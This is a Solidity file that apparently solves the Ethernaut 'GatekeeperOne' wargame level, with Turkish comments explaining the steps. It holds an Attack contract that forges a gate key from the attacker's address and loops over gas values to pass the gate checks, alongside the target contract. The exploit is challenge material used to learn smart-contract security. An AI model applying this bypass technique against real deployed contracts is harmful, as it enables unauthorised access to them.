// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Attack {
    //           1 byte = 8 bit = 2 hexadecimal

    // Şartlar : 1)Son 4 hexadecimal ile son 8 hexadecimal aynı olacak
    //           2)Son 8 hexadecimal ile son 16 hexadecimal aynı olmayacak
    //      0x7EFd0B777026A9c42757d92A3f79361467372435 -> Bizim adresimiz (tx.origin)
    bytes8 txOrigin16 = 0x3f79361467372435; //son 16 hanesi
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; //F = 1111
    //                              0x3f79361400002435

    GatekeeperOne g1;
    address enemyContractAddress;

    constructor(address enemyAddress) public {
        g1 = GatekeeperOne(enemyAddress);
        enemyContractAddress = enemyAddress;
    }

    function attack() public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool result, bytes memory data) = enemyContractAddress.call{
                gas: i + 80000
            }(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
